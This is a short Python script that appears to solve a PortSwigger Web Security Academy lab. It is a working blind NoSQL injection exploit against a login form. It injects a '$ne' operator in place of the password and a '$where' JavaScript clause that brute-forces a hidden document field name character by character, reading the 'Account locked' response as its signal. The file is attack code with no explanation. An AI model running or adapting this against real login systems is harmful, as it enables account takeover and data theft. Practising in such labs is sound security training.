import requests
from string import ascii_lowercase, ascii_uppercase, digits

url = "https://0a1300d704fa403d8409dc3a000b007b.web-security-academy.net/login"

data_json = {
    "username": "carlos",
    "password": {"$ne":"hello"},
    "$where": "Object.keys(this)[3].match('^.{0}.*')"
}

row_name = ""

while True:
    for c in "-_" + ascii_lowercase + ascii_uppercase + digits:
        row = row_name + c
        payload = "Object.keys(this)[4].match('^.{0}" + row + ".*')"
        data_json["$where"] = payload
        res = requests.post(url, json=data_json, allow_redirects=False)

        if "Account locked" in res.text:
            row_name += c
            print(row_name)
            break
    
    if row_name == "":
        break

